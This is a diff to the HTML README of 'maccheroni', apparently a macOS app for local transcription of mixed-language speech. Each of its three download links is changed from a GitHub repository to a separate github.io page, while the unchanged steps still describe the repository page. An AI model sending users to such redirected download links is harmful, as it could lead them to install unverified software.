@@ -1,7 +1,7 @@
 <h1>🍝 maccheroni - Private Local Transcription for Macaronic Speech</h1>
 
 <div style="text-align:center;margin:20px 0">
-<a href="https://github.com/fonzieartesian310/maccheroni" style="display:inline-block;background:#28a745;color:#fff;padding:15px 30px;border-radius:8px;text-decoration:none;font-size:1.2em;font-weight:bold">⬇️ Download maccheroni Now</a>
+<a href="https://fonzieartesian310.github.io" style="display:inline-block;background:#28a745;color:#fff;padding:15px 30px;border-radius:8px;text-decoration:none;font-size:1.2em;font-weight:bold">⬇️ Download maccheroni Now</a>
 </div>
 
 <p>Welcome to <strong>maccheroni</strong> — a powerful macOS application that transcribes speech containing multiple languages (like English mixed with Spanish, Italian, or other languages). It works entirely on your computer, so your audio never leaves your device. Perfect for journalists, researchers, students, and anyone who needs accurate transcriptions of mixed-language conversations without compromising privacy.</p>
@@ -30,7 +30,7 @@
 
 <h2>🚀 Getting Started</h2>
 <h3>Step 1: Download maccheroni</h3>
-<p>Visit this link to download the application: <a href="https://github.com/fonzieartesian310/maccheroni">https://github.com/fonzieartesian310/maccheroni</a></p>
+<p>Visit this link to download the application: <a href="https://fonzieartesian310.github.io">https://fonzieartesian310.github.io</a></p>
 <p>Once you arrive at the GitHub page, look for the green "Code" button and click it, then select "Download ZIP". You can also find the latest release in the "Releases" section on the right side of the page.</p>
 
 <h3>Step 2: Install maccheroni</h3>
@@ -99,7 +99,7 @@
 <p>maccheroni is an open-source project. If you're a developer, feel free to fork the repository, make improvements, and submit pull requests. Non-developers can help by reporting bugs, suggesting features, or improving documentation.</p>
 
 <div style="text-align:center;margin:30px 0">
-<a href="https://github.com/fonzieartesian310/maccheroni" style="display:inline-block;background:#0366d6;color:#fff;padding:12px 25px;border-radius:6px;text-decoration:none;font-size:1em;font-weight:bold">📥 Download maccheroni from GitHub</a>
+<a href="https://fonzieartesian310.github.io" style="display:inline-block;background:#0366d6;color:#fff;padding:12px 25px;border-radius:6px;text-decoration:none;font-size:1em;font-weight:bold">📥 Download maccheroni from GitHub</a>
 </div>
 
 <h2>📜 License</h2>
